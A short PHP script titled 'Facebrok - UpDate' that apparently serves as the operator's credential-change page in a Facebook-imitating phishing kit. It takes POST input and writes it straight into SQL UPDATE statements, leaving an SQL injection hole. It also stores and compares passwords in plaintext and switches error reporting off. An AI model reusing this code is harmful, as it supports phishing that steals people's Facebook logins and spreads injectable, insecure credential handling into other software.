<?php
// Configuration -------------------
include ("config.php");
//----------------------------------
error_reporting(0);
$passo=$_POST['passs'];
$passn=$_POST['passn'];
$usern=$_POST['usern'];
// Confirmation ---------------------
session_start();
if($_SESSION['user']){
if ($passo==$_SESSION['pass']){
// Connections
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//-----------------------------------
mysql_query("SELECT * FROM users WHERE id=1") or die ('Failed Consult: '.mysql_error());
mysql_query("UPDATE users SET user='$usern' WHERE id=1");
mysql_query("UPDATE users SET pass='$passn' WHERE id=1");

echo '
<title>Facebrok - UpDate</title><style type="text/css" media="screen">
<!--a:link   {text-decoration:none;}   -->
</style><link rel="shortcut icon" href="facebook.ico" />
<table width="100%" border="0" height="100%" cellspacing="0"><td valign="middle"><div align="center"><OBJECT classid>
<span style="color:#666"><span style="font-family: Arial;font-size:20">Done, User Update</span></span>
     ';
}else{
	echo '
<title>Facebrok - UpDate</title><style type="text/css" media="screen">
<!--a:link   {text-decoration:none;}   -->
</style><link rel="shortcut icon" href="facebook.ico" />
<table width="100%" border="0" height="100%" cellspacing="0"><td valign="middle"><div align="center"><OBJECT classid>
<span style="color:#666"><span style="font-family: Arial;font-size:20">Password Wrong.</span></span>
     ';
}} else {header("location:../croak");}
?>